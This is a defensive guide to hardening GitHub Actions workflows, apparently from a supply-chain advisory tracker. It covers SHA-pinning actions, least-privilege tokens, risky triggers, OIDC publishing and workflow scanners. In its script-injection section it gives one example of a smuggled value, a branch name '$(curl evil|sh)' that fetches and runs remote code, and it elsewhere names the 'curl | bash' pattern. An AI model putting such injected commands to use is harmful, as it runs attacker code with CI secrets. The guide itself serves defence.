# CI/CD & GitHub Actions hardening

> Your CI runs third-party code with your repo's write token and your secrets, on every push — and often on a timer with nobody watching. Pin it to immutable commits, scope its permissions to the floor, and never let a re-taggable action publish as you.

CI is now a primary supply-chain target, not an afterthought. A GitHub Actions workflow checks out your code, holds `GITHUB_TOKEN` (and whatever secrets you've added), and frequently runs **`uses:` steps you don't control**. If one of those actions is compromised — or your workflow can be tricked into running attacker input — the blast radius is "everything your CI can touch": push access, releases, package publishing, cloud creds via OIDC. Several incidents in this tracker landed exactly here: [Megalodon](../advisories/2026-05-megalodon-github-actions-mass-campaign.md) (mass workflow injection), [elementary-data](../advisories/2026-04-elementary-data-pypi-ghcr-compromise.md) (Actions script-injection → PyPI/GHCR), [Comment-and-Control](../advisories/2026-04-comment-and-control-pr-injection.md) (PR-triggered injection), and the [TanStack Mini Shai-Hulud](../advisories/2026-05-tanstack-mini-shai-hulud.md) CI-pipeline compromise.

## Read first

- **[GitHub — Security hardening for GitHub Actions](https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions)** — the foundational reference (pinning, `GITHUB_TOKEN` scope, untrusted input).
- **[OpenSSF — Maintainer's guide to securing CI/CD after the tj-actions & reviewdog attacks](https://openssf.org/blog/2025/06/11/maintainers-guide-securing-ci-cd-pipelines-after-the-tj-actions-and-reviewdog-supply-chain-attacks/)** — written after the 2025 retag attacks; the playbook this guide follows.
- **[Wiz — Hardening GitHub Actions: Lessons from Recent Attacks](https://www.wiz.io/blog/github-actions-security-guide)**.
- **[`zizmor`](https://github.com/woodruffw/zizmor)** — static analysis for workflow files; catches the Pwn Request and template-injection patterns automatically.
- **[StepSecurity Harden-Runner](https://github.com/step-security/harden-runner)** — runtime egress allowlist + tamper detection for the runner.

## 1. Pin every action to a full commit SHA — not a tag

A version tag (`@v4`, `@main`) is **mutable**: the publisher (or whoever steals their token) can move it to point at new code, and your next run silently executes it. This is precisely how the **2025 tj-actions/reviewdog retag attacks** worked — a popular action's tag was repointed at credential-stealing code and ran in thousands of pipelines.

```yaml
# ❌ mutable — a retag changes what runs, with no diff in your repo
- uses: actions/checkout@v4
- uses: peaceiris/actions-gh-pages@v3

# ✅ immutable — the SHA can't be moved; keep the version in a comment
- uses: actions/checkout@34e114876b0b11c390a56381ad16ebd13914f8d5 # v4
- uses: peaceiris/actions-gh-pages@<full-40-hex-sha> # v4.0.0
```

- Resolve a tag to its commit: `gh api repos/<owner>/<action>/commits/<tag> --jq .sha`.
- Automate the conversion with **[`pinact`](https://github.com/suzuki-shunsuke/pinact)** (`pinact run` rewrites every `uses:` to a SHA + version comment).
- Keep the pins current with **Dependabot** (`package-ecosystem: github-actions`) — it understands SHA pins and bumps them with the matching version in the PR.
- This applies to *all* publishers. First-party `actions/*` are lower-probability targets, but "reputable" is not "immutable" — pin them too.

## 2. Never hand a re-taggable third-party action a write token

The worst single pattern: a **third-party action on a floating tag** that receives `secrets.GITHUB_TOKEN` (or any secret) under a write permission. A retag of that tag runs attacker code with your write creds. If you use a third-party deploy/publish action (e.g. `peaceiris/actions-gh-pages`), pin it to a SHA **and** give the job the minimum permission it needs — or replace it with a first-party equivalent (`actions/deploy-pages` for Pages).

## 3. Minimize `permissions:` — the default token is too broad

If a workflow has no `permissions:` block, the job inherits the repo's default `GITHUB_TOKEN` scope, which can be read/write across contents, packages, and more. Set least privilege explicitly. A job-level block **replaces** the top-level one, so scope each job to exactly what it does:

```yaml
permissions:
  contents: read          # safe default for every job

jobs:
  build:
    # inherits contents: read — enough to checkout + build
  deploy:
    permissions:           # only the deploy job gets these
      pages: write
      id-token: write
```

Rule of thumb: **`contents: read` everywhere**, and add a single write scope only on the one job that needs it.

## 4. Treat `pull_request_target`, `workflow_run`, and `issue_comment` as dangerous

These triggers run **with the base repo's secrets and a write token**, but can be influenced by untrusted forks/PRs/comments. The classic "Pwn Request": a workflow checks out the **PR head** (attacker code) and then runs it (build/test) with secrets in scope. Don't. If you must process PR content, do it in a `pull_request` job with no secrets, or split into a privileged job that only consumes trusted artifacts. See [Comment-and-Control](../advisories/2026-04-comment-and-control-pr-injection.md) for the PR-injection pattern.

## 5. Don't interpolate untrusted input into `run:` shells

`${{ github.event.* }}` (PR titles, branch names, issue bodies, `workflow_dispatch` inputs) expanded directly into a `run:` block is **script injection** — the value becomes shell. Pass it through `env:` and quote it:

```yaml
# ❌ injection: a branch named "$(curl evil|sh)" executes
- run: echo "Building ${{ github.event.inputs.slug }}"
# ✅ value is data, never parsed as shell
- env:
    SLUG: ${{ github.event.inputs.slug }}
  run: echo "Building $SLUG"
```

## 6. Watch scheduled jobs that hold write tokens

A workflow on `schedule:` with `contents: write` (or `pull-requests: write`) is the highest-value target there is: a retagged action runs there **automatically, with credentials, no human in the loop**. Scrapers/refresh jobs that commit data back are the common case. Pin their actions hardest, give them the narrowest write scope, and prefer opening a PR (reviewable) over pushing to `main`.

## 7. Don't fetch-and-run code in CI

No `curl … | bash`, no `pip install`/`npx` from a raw URL, no installing an unpinned tool mid-job. Install only from committed, pinned manifests (`npm ci`, `pip install --require-hashes -r …`), and pin any CLI you download to a version + checksum. Each unpinned fetch is a fresh "run the latest from the internet" trigger inside your trusted, secret-holding environment.

## 8. Kill long-lived publish tokens — use OIDC / trusted publishing

A publish token in `secrets` is a standing liability. Prefer short-lived OIDC: **[npm trusted publishing](https://docs.npmjs.com/trusted-publishers/)**, **[PyPI Trusted Publishing](https://docs.pypi.org/trusted-publishers/)**, and cloud OIDC (`id-token: write` → assume-role) instead of static keys. See [npm-hardening.md](npm-hardening.md#if-you-publish-packages-enable-trusted-publishing).

## 9. Scan the workflows themselves

- **[`zizmor`](https://github.com/woodruffw/zizmor)** in pre-commit/CI — flags unpinned actions, injection sinks, dangerous triggers, over-broad permissions.
- **[StepSecurity Harden-Runner](https://github.com/step-security/harden-runner)** — `egress-policy: block` with an allowlist catches a compromised step phoning home.
- **[OpenSSF Scorecard](https://github.com/ossf/scorecard)** — scores `Pinned-Dependencies`, `Token-Permissions`, `Dangerous-Workflow` and publishes a badge.

## What this stops

| Attack | Mitigation |
|---|---|
| Action retag (tj-actions/reviewdog class) | SHA-pin every `uses:` (§1) + Dependabot |
| Third-party action exfiltrates your token | SHA-pin + least-priv permissions (§1, §2, §3) |
| Pwn Request (untrusted PR code runs with secrets) | avoid `pull_request_target` checkout+exec (§4) |
| Template/script injection via event input | pass via `env:` + quote (§5) |
| Compromised cron job pushing malware | narrow write scope + PR-not-push on scheduled jobs (§6) |
| Stolen publish token republishes your package | OIDC / trusted publishing, no static tokens (§8) |
| `curl\|bash` / unpinned tool fetch in CI | install from pinned manifests only (§7) |

## What it doesn't stop

- A first-party action whose **upstream is compromised and not yet known-bad** while your pin still points at the malicious commit — SHA-pinning makes the change *visible and reviewable* (it's a Dependabot PR, not a silent retag), but you still have to read the diff.
- A workflow that's *correctly* pinned and scoped but runs a build script that itself pulls a compromised dependency — that's the package-manager surface; pair this guide with [npm-hardening.md](npm-hardening.md) and the [package-vetting checklist](package-vetting-checklist.md).
